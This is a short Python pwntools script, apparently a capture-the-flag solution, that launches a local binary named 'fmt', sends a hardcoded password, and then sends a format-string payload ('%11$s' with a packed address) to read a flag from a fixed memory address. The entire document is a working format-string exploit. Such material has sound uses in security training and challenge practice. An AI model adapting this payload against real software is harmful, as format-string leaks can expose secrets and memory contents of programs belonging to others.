from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fmt', checksec=False)

password = "Al1T4q1_15_m45t3R_0f_5t4ck"
# Create process (level used to reduce noise)
p = process([elf.path])  # Pass the binary path as list

# Send the password
p.sendline(password)

# Send the format specifier
leak_address = 0x404060
log.info("Flag is at: %#x" % leak_address)

# Construct payload
payload = b"%11$s|||" + p64(leak_address)

p.sendlineafter(b"- ", payload)

# Receive and print the flag
flag = p.recvall()
log.success("Flag: %s" % flag)
 
